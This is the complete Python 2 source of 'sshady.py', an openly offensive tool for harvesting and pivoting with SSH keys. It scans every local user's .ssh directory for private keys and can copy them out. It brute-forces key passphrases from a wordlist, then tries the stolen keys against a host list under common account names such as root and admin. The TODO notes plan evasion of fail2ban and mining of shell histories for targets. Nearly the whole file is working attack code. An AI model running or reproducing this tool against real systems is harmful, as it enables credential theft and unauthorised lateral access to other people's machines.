#!/usr/bin/env python
"""
sshady.py -- SSH key harvesting and pivoting things.
          -- Dropping cyber warheads on digital foreheads.
          --
          -- by Daniel Roberson @dmfroberson July/2017

This is still being worked on, so probably lots of bugs and weirdness.

TODO:
  - Cracking improvements
    -- -u/-U hydra-style to specify user or list
    -- -h/-H to specfy single host or list
    -- threading?
  - Attempt to login to supplied hosts using captured keys
    -- Nmap XML/greppable output as input?
    -- grep users shell histories for hosts they've connected to?
       - also glean usernames from this!!
    -- Supply an input list for hosts/usernames
       - Create unique list based on pwent for use on current network
  - Input directory full of keys, or specify /home rather than searching pwents
  - Ability to specify single key location, hosts, usernames and not search for
    keys locally.
  - Show elapsed time
  - Ability to scan slower to not trip fail2ban setups.

Requires:
  - paramiko
"""

import os
import pwd
import shutil
import signal
import argparse
import paramiko

VALID_KEYS = []


class Settings(object):
    """ Settings Object -- Stores various application settings and functions
                        -- to update, retrieve, and manipulate them.
    """
    __config = {
        "wordlist" : "wordlist.txt",
        "terse" : False,
        "crack" : True,
        "outdir" : None,
        "hostfile" : None,
        "userfile" : None,
    }

    __settings = [
        "wordlist",
        "terse",
        "crack",
        "outdir",
        "hostfile",
        "userfile"
    ]

    hosts = []
    users = ["root", "nagios", "admin", "guest", "www", "www-data", "rsync"]


    @staticmethod
    def config(name):
        """ Settings.config() -- Retrieve a configuration setting.

        Args:
            name (str) - Name of configuration setting to retrieve.

        Returns:
            Contents of configuration setting.
        """
        return Settings.__config[name]


    @staticmethod
    def set(name, value):
        """ Settings.set() -- Set a configuration setting.

        Args:
            name (str) - Name of configuration setting to set.
            value      - Value to place into setting.
        Returns:
            Nothing.

        Raises a NameError exception if the supplied setting does not exist.
        """
        if name in Settings.__settings:
            Settings.__config[name] = value
        else:
            raise NameError("Not a valid setting for set() method: %s" % name)


    @staticmethod
    def update_wordlist(wordlist):
        """ Settings.update_wordlist() -- Updates wordlist settings.

        Args:
            wordlist (str) - Path to wordlist.

        Returns:
            True if the wordlist is accessible.
            False if the wordlist is not accessible.
        """
        Settings.set("wordlist", wordlist)

        # Make sure wordlist is readable.
        if not os.access(wordlist, os.R_OK):
            xprint("[-] Unable to open wordlist %s for reading" % wordlist)
            xprint("[-] Exiting.")
            terseprint("Unable to open wordlist %s for reading. Exiting." % \
                       wordlist)
            return False

        # Search for at least one non-blank line in wordlist
        count = 0
        with open(wordlist) as linecount:
            for word in linecount:
                word = word.rstrip()

                # Skip blank lines
                if not word:
                    continue

                # Found a valid line. Exit the loop
                count += 1
                break

        if count > 0:
            return True

        xprint("[-] Wordlist %s contains no valid words." % wordlist)
        xprint("[-] Exiting.")
        terseprint("Wordlist %s contains no valid words. Exiting." % wordlist)
        return False

    @staticmethod
    def update_output_directory(directory):
        """ Settings.update_output_directory() -- Updates output dir setting

        Args:
            directory (str) - Dictory to place discovered SSH keys into.

        Returns:
            True if the directory setting is valid and writable.
            False if the directory is not writable or invalid.
        """
        if not directory:
            return True

        Settings.set("outdir", directory)

        # Make sure output directory is writable.
        if directory and not os.path.isdir(directory):
            xprint("[-] %s is not a directory." % directory)
            xprint("[-] Exiting.")
            terseprint("%s is not a directory. Exiting." % directory)
            return False

        if directory and not os.access(directory, os.W_OK):
            xprint("[-] Unable to write to output directory %s" % directory)
            xprint("[-] Exiting.")
            terseprint("Unable to write to output directory %s. Exiting." % \
                       directory)
            return False

        return True


    @staticmethod
    def update_user_file(userfile):
        """ Settings.update_user_file() -- Updates userfile setting

        Args:
            userfile (str) - Path to file containing lists of usernames.

        Returns:
            True if the setting is valid and the input file is readable.
            False if the user file cannot be read.
        """
        # TODO: handle empty files.
        if not userfile:
            return True

        Settings.set("userfile", userfile)

        try:
            with open(userfile) as inputfile:
                Settings.users = [line.rstrip(os.linesep) \
                                  for line in inputfile \
                                  if line.rstrip(os.linesep)]
        except IOError, err:
            xprint("  [-] Unable to open user list %s: %s" % (userfile, err))
            xprint("  [-] Exiting.")
            return False

        return True


    @staticmethod
    def update_host_file(hostfile):
        """ Settings.update_host_file() -- Updates hostfile setting

        Args:
            hostfile (str) - Path to file containing list of hosts to attempt
                             key-based SSH logins in "HOST PORT" format.

        Returns:
            True if the setting is valid and the input file is readable.
            False if the input file cannot be read.
        """
        # TODO: handle empty files.
        if not hostfile:
            return True

        Settings.set("hostfile", hostfile)

        try:
            with open(hostfile) as inputfile:
                Settings.hosts = [line.rstrip(os.linesep) \
                                  for line in inputfile \
                                  if line.rstrip(os.linesep)]
        except IOError, err:
            xprint("  [-] Unable to open host list %s: %s" % (hostfile, err))
            xprint("  [-] Exiting.")
            return False

        return True


class Color(object):
    """ Color Object -- Contains constants and methods regarding ANSI colors.
    """
    BOLD = "\033[1m"
    END = "\033[0m"

    @staticmethod
    def disable():
        """ Color.disable() -- Disable color output"

        Args:
            None

        Returns:
            Nothing
        """
        Color.BOLD = ""
        Color.END = ""


    @staticmethod
    def bold_string(buf):
        """ Color.bold_string() -- Wrap a string in ANSI codes to make it bold

        Args:
            buf (str) - String to wrap

        Returns:
            A string encapsulated in ANSI codes to make it bold
        """
        return Color.BOLD + buf + Color.END


def xprint(message):
    """ xprint() -- Wrapper for print function that honors terse setting

    Args:
        message (str) - String to output

    Returns:
        Nothing
    """
    if not Settings.config("terse"):
        print message


def terseprint(message):
    """ terseprint() -- Wrapper for print function that displays terse messages

    Args:
        message (str) - String to output

    Returns:
        Nothing
    """
    if Settings.config("terse"):
        print message


def crack_key(keyfile, username, wordlist):
    """ crack_key() -- Launches a wordlist attack against SSH key

    Args:
        keyfile (str)  - Path to SSH private key.
        wordlist (str) - Path to wordlist.

    Returns:
        True if the password has been discovered.
        False if the password has not been discovered.
    """
    # Try username as password first
    result = try_key(keyfile, username)
    if type(result) == str:
        xprint(Color.bold_string(
            "      [+] Success! %s:%s" % (keyfile, username)))
        terseprint("%s %s" % (keyfile, username))
        VALID_KEYS.append((username, keyfile, username))
        return True

    # Try with wordlist.
    with open(wordlist) as passwords:
        for password in passwords:
            password = password.rstrip()
            if not password:
                continue

            result = try_key(keyfile, password)
            if type(result) == str:
                xprint(Color.bold_string(
                    "      [+] Success! %s:%s" % (keyfile, result)))
                terseprint("%s %s" % (keyfile, result))
                VALID_KEYS.append((username, keyfile, result))
                return True

    xprint("      [-] Unable to crack SSH key with supplied wordlist.")
    terseprint(keyfile)

    return False


def get_key_type(keyfile):
    """ get_key_type() -- determines which type of SSH key a keyfile is

    Args:
        keyfile (str) - Path to SSH key file

    Returns:
        paramiko from_private_key_file relevant to keyfile on success
        None if this function was unable to determine key type.
    """
    ssh_key_types = [paramiko.RSAKey.from_private_key_file,
                     paramiko.DSSKey.from_private_key_file,
                     paramiko.ECDSAKey.from_private_key_file]

    for key_type in ssh_key_types:
        try:
            key_type(keyfile)
        except paramiko.ssh_exception.PasswordRequiredException:
            return key_type
        except paramiko.ssh_exception.SSHException:
            continue

        return key_type

    return None


def try_key(keyfile, password=None):
    """ try_key() -- Tries to use an SSH key.

    Args:
        keyfile (str)  - Path to SSH private key
        password (str) - Password to attempt. Default None.

    Returns:
        True if it is a valid key, but the wrong password was supplied.
        False if it is not a valid key.
        The password if it is a valid key and password.
    """
    key_type = get_key_type(keyfile)

    if key_type is None:
        return False

    try:
        key_type(keyfile, password=password)
    except paramiko.ssh_exception.PasswordRequiredException:
        # Valid key, wrong password
        return True
    except paramiko.ssh_exception.SSHException:
        # Key doesn't work here
        return False

    return password


def process_key(keyfile, username):
    """ process_key() -- Determine whether a file is a valid SSH key or not and
                      -- act accordingly.

    Args:
        keyfile (str) - Path to file to check

    Returns:
        True if keyfile is an SSH key.
        False if keyfile is unreadable or not an SSH key.
    """
    if not os.access(keyfile, os.R_OK):
        return False

    result = try_key(keyfile)

    if result == True:
        xprint("  [+] %s appears to be a valid key" % keyfile)

        # Copy keys for the future, if asked to do so.
        if Settings.config("outdir"):
            outfile = os.path.join(Settings.config("outdir"), "%s-%s" % \
                                   (username, os.path.basename(keyfile)))
            shutil.copy2(keyfile, outfile)

        # Crack passwords, if asked.
        if Settings.config("crack"):
            xprint("    [*] Attempting to crack using wordlist: %s" % \
                   Settings.config("wordlist"))
            crack_key(keyfile, username, Settings.config("wordlist"))
        else:
            terseprint(keyfile)
    elif result == False:
        # Probably not an SSH key
        return False
    elif result == None:
        # No password
        xprint(Color.bold_string(
            "  [+] %s appears to be a valid, passwordless key" % keyfile))
        terseprint("%s -- NO PASSWORD" % keyfile)
        VALID_KEYS.append((username, keyfile, result))

        return True

    return True


def try_ssh_key_login(username, keyfile, password, host, port=22):
    """ try_ssh_key_login() -- Attempts an SSH login using supplied credentials

    Args:
        username (str) - Username
        password (str) - Password for SSH key

    Returns:
        True if the login was successful
        False otherwise
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    key_type = get_key_type(keyfile)
    if key_type is None:
        # Not a valid key
        return False

    key = key_type(keyfile, password=password)

    # Supress error messages.
    #TODO: figure out if there's a better way.
    paramiko.util.log_to_file("/dev/null")

    try:
        client.connect(
            host,
            username=username,
            port=port,
            pkey=key,
            allow_agent=False,
            look_for_keys=False)
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except paramiko.ssh_exception.SSHException:
        # TODO: Handle this properly. Happens when host isnt running SSH
        return False
    except paramiko.ssh_exception.NoValidConnectionsError:
        # TODO: Handle this properly. Happens when cant connect.
        return False

    return True


def find_ssh_directories():
    """ find_ssh_directories() -- Search pwents for home directories with .ssh
            directories. Scans each file in .ssh directory for valid SSH keys.
            Valid keys are added to VALID_KEYS list.

    Args:
        None

    Returns:
        True
    """
    # TODO: search /home for orphaned home directories that may contain keys
    xprint("[+] Searching for SSH keys via valid pwents..")

    for pwent in pwd.getpwall():
        user = pwent[0]
        sshdir = os.path.join(os.path.expanduser("~%s" % user), ".ssh")

        if os.path.isdir(sshdir):
            xprint("[*] Found .ssh directory for user %s: %s" % (user, sshdir))
            for root, _, filenames in os.walk(sshdir):
                for filename in filenames:
                    checkfile = os.path.join(root, filename)
                    process_key(checkfile, user)

    xprint("")
    xprint("[+] %s usable %s discovered." %
           (len(VALID_KEYS), "keys" if len(VALID_KEYS) > 1 else "key"))

    return True


def attempt_ssh_logins():
    """ attempt_ssh_logins() -- Attempt to login to specified hosts using the
                             -- keys discovered by this program.

    Args:
        None

    Returns:
        True
    """
    xprint("")
    xprint("[+] Attempting to login to hosts using discovered keys..")

    for host in Settings.hosts:
        port = 22
        if " " in host:
            port = int(host.split()[1])
            host = host.split()[0]
        xprint("  [*] Trying %s:%s" % (host, port))

        for key in VALID_KEYS:
            username, keyfile, password = key

            # Try username first
            if try_ssh_key_login(username, keyfile, password, host, port):
                xprint(Color.bold_string(
                    "    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
                    (username, host, keyfile, password)))

            # Try list of usernames now.
            for user in Settings.users:
                # Skip if user equals username, because this was tried first.
                if user == username:
                    continue

                if try_ssh_key_login(user, keyfile, password, host, port):
                    xprint(Color.bold_string(
                        "    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
                        (user, host, keyfile, password)))

    return True


def sigint_handler(signum, frame):
    """ sigint_handler() -- Generic SIGINT handler
    """
    xprint("[-] Caught SIGINT.")
    xprint("[-] Exiting..")
    exit(os.EX_USAGE)

def parse_cli():
    """ parse_cli() -- Parse CLI input

    Args:
        None

    Returns:
        ArgumentParser namespace relevant to supplied CLI options
    """
    description = "example: ./sshady.py [-d <outdir>]"
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument("-t",
                        "--terse",
                        help="Toggles terse output (useful for scripting)",
                        action="store_true",
                        required=False,
                        default=False)
    parser.add_argument("-w",
                        "--wordlist",
                        help="Specify wordlist to use. Default: %s" % \
                        Settings.config("wordlist"),
                        required=False,
                        default=Settings.config("wordlist"))
    parser.add_argument("-n",
                        "--nocrack",
                        help="Don't attempt to crack SSH keys.",
                        action="store_false",
                        required=False,
                        default=True)
    parser.add_argument("-o",
                        "--outdir",
                        help="Optional directory to save keys to",
                        required=False,
                        default=None)
    parser.add_argument("-f",
                        "--hosts",
                        help="File containing list of hosts. Format: \"ip.address port\" (port optional)",
                        required=False,
                        default=None)
    parser.add_argument("-u",
                        "--users",
                        help="File containing list of usernames to try",
                        required=False,
                        default=None)
    parser.add_argument("--nocolor",
                        help="Disable ANSI color code output",
                        required=False,
                        action="store_true")

    args = parser.parse_args()

    return args


def main():
    """ main() -- entry point of program

    Args:
        None

    Returns:
        os.EX_OK on successful run
        os_EX_USAGE on failed run
    """
    signal.signal(signal.SIGINT, sigint_handler)

    args = parse_cli()

    if args.nocolor:
        Color.disable()

    # Need to configure terse first for proper output
    Settings.set("terse", args.terse)

    xprint("[+] sshady.py -- by Daniel Roberson @dmfroberson")
    xprint("")

    # Update setting for whether or not to attempt cracking of SSH keys
    Settings.set("crack", args.nocrack)

    # Make sure settings are sane
    if not Settings.update_wordlist(args.wordlist) or \
       not Settings.update_output_directory(args.outdir) or \
       not Settings.update_user_file(args.users) or \
       not Settings.update_host_file(args.hosts):
        return os.EX_USAGE

    # Search for users passwords.
    # TODO don't do this if key directory is specified.
    find_ssh_directories()

    # If a hostfile is specified, loop through hosts and try to login with
    # each of the harvested keys.
    if Settings.config("hostfile"):
        attempt_ssh_logins()

    xprint("")
    xprint("[+] You must defeat Sheng Long to stand a chance.")
    xprint("[+] Done.")

    return os.EX_OK


if __name__ == "__main__":
    exit(main())
